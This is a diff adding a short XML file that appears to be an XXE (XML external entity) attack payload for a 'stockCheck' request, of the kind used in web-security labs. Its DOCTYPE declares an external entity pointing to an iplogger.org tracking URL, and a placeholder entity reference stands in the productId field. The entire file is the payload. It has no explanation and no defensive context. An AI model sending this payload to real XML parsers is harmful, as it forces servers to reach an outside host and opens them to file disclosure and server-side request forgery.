@@ -1,1 +1,6 @@
-
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "https://iplogger.org/1IJXA"> ]>
+<stockCheck>
+    <productId>&toreplace;</productId>
+    <storeId>1</storeId>
+</stockCheck>
